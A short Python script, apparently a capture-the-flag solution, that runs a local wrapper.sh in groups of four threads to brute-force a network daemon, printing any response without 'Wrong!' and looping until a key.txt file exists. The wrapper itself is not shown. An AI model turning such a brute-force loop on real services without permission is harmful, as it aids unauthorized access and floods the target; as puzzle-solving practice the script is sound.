#!/usr/bin/python3
import subprocess
import threading
import os.path

#connect to the network daemon and collect the data
def connect():
    return subprocess.check_output("./wrapper.sh").decode('utf-8')

#check the output for the absence of the key
def check_fail(arg):
    if "Wrong!" in arg:
        return True
    else:
        return False

#pull it all together
def bruteforce():
    current = connect()
    if check_fail(current) != True:
        print(current)

#call the bruteforce method in groups of four to speed up process
def slam_the_daemon():
    threads = []

    for _ in range(4):
        t = threading.Thread(target=bruteforce)
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

slam_the_daemon()
if(os.path.exists('key.txt') != True):
    while(os.path.exists('key.txt') != True):
        slam_the_daemon()

